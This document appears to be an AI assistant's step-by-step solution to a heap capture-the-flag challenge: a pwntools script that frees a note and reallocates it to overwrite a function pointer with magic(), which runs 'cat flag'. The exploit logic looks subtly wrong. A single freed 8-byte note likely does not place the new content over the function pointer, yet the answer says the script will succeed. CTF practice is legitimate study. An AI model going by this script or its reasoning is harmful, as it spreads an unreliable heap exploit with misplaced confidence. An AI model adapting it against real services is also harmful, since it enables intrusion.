@@ -1,0 +1,121 @@
+To solve this challenge using `pwntools`, you need to exploit the vulnerability in the program. Here's a step-by-step guide to solving this challenge:
+
+---
+
+### **Analysis of the Challenge**
+1. **Vulnerability**:
+   - The `print_note()` function calls a function pointer stored in the `notelist` array.
+   - The function pointer is set to `print_note_content` during the `add_note()` function.
+   - However, the program does not validate the function pointer before calling it in `print_note()`. This allows us to overwrite the function pointer with the address of the `magic()` function.
+
+2. **Plan**:
+   - Allocate a note using `add_note()`.
+   - Free the note using `del_note()`. This will allow us to reuse the memory.
+   - Overwrite the function pointer in the freed chunk with the address of the `magic()` function.
+   - Trigger the overwritten function pointer by calling `print_note()`.
+
+3. **Goal**:
+   - Call the `magic()` function, which executes `system("cat flag")` to print the flag.
+
+---
+
+### **Steps to Exploit**
+1. **Set up the environment**:
+   - Load the binary using `pwntools`.
+   - Identify the addresses of the `magic()` function and the `notelist` array.
+
+2. **Exploit the vulnerability**:
+   - Add a note to allocate memory.
+   - Delete the note to free the memory.
+   - Overwrite the function pointer in the freed chunk with the address of `magic()`.
+   - Call `print_note()` to trigger the exploit.
+
+3. **Retrieve the flag**:
+   - Capture the output of the program to get the flag.
+
+---
+
+### **Exploit Code**
+Here is the Python exploit script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = './heap'
+elf = ELF(binary)
+p = process(binary)
+
+# Addresses
+magic_addr = elf.symbols['magic']  # Address of the magic() function
+log.info(f"magic() address: {hex(magic_addr)}")
+
+# Helper functions
+def add_note(size, content):
+    p.sendlineafter("Your choice :", "1")  # Choose "Add note"
+    p.sendlineafter("Note size :", str(size))  # Provide the size of the note
+    p.sendlineafter("Content :", content)  # Provide the content of the note
+
+def delete_note(index):
+    p.sendlineafter("Your choice :", "2")  # Choose "Delete note"
+    p.sendlineafter("Index :", str(index))  # Provide the index of the note to delete
+
+def print_note(index):
+    p.sendlineafter("Your choice :", "3")  # Choose "Print note"
+    p.sendlineafter("Index :", str(index))  # Provide the index of the note to print
+
+# Exploit
+# Step 1: Add a note
+add_note(8, "A" * 8)  # Add a note with size 8 and content "A" * 8
+
+# Step 2: Delete the note
+delete_note(0)  # Delete the note at index 0
+
+# Step 3: Overwrite the function pointer
+# Reuse the freed chunk and overwrite the function pointer with the address of magic()
+add_note(8, p32(magic_addr))  # Add a note with the address of magic() as content
+
+# Step 4: Trigger the overwritten function pointer
+print_note(0)  # Call print_note() on the overwritten chunk
+
+# Get the flag
+p.interactive()
+```
+
+---
+
+### **Explanation of the Code**
+1. **Initialization**:
+   - Load the binary using `pwntools` and extract the address of the `magic()` function.
+
+2. **Adding and Deleting Notes**:
+   - Use the `add_note()` function to allocate memory for a note.
+   - Use the `delete_note()` function to free the memory, making it available for reuse.
+
+3. **Overwriting the Function Pointer**:
+   - Allocate a new note in the same memory location as the freed chunk.
+   - Overwrite the function pointer with the address of the `magic()` function.
+
+4. **Triggering the Exploit**:
+   - Use the `print_note()` function to call the overwritten function pointer, which now points to `magic()`.
+
+5. **Retrieving the Flag**:
+   - The `magic()` function executes `system("cat flag")`, printing the flag to the output.
+
+---
+
+### **Running the Exploit**
+1. Save the script as `exploit.py`.
+2. Run the script:
+   ```bash
+   python3 exploit.py
+   ```
+3. The flag should be printed in the output.
+
+---
+
+### **Important Notes**
+- Ensure that the binary is in the same directory as the script or provide the correct path.
+- If the challenge is hosted remotely, replace `process(binary)` with `remote(host, port)` and provide the host and port of the challenge server.
+
+This script should successfully exploit the vulnerability and retrieve the flag.
